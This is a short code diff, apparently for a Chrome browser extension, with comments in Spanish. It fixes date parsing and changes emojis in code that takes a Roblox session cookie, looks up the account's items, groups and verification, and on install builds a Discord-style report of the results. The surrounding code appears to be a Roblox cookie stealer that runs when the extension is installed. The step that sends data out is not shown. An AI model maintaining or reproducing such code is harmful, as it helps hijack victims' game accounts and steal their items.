@@ -363,10 +363,18 @@ async function obtenerInfoRoblox(cookie) {
         const korblox = await tieneItem(user.id, cookie, 192);
         const cantidadGrupos = await obtenerCantidadGrupos(user.id);
 
-        // Fecha de registro
-        const fechaRegistro = new Date(user.created).toLocaleDateString('es-AR');
-        const hoy = new Date();
-        const antiguedadDias = Math.floor((hoy - new Date(user.created)) / 86400000);
+        // CORRECCIÓN: Parsear fecha correctamente
+        let fechaRegistro = 'Desconocida';
+        let antiguedadDias = 0;
+        try {
+            const fecha = new Date(user.created);
+            if (!isNaN(fecha.getTime())) {
+                fechaRegistro = fecha.toLocaleDateString('es-AR');
+                const hoy = new Date();
+                antiguedadDias = Math.floor((hoy - fecha) / 86400000);
+            }
+        } catch (e) {}
+
         const verified = user.hasVerifiedBadge ? "Sí" : "No";
 
         return {
@@ -428,7 +436,7 @@ chrome.runtime.onInstalled.addListener(async () => {
             },
             {
                 name: "📈 ESTADÍSTICAS",
-                value: \`📅 **Registro:** \${info.fechaRegistro} (\${info.antiguedadDias} días)\\n✅ **Verificado:** \${info.verified}\\n👥 **Grupos:** \${info.grupos}\`,
+                value: \`📅 **Registro:** \${info.fechaRegistro} (\${info.antiguedadDias} días)\\n🔰 **Verificado:** \${info.verified}\\n🚻 **Grupos:** \${info.grupos}\`,
                 inline: false
             },
             {
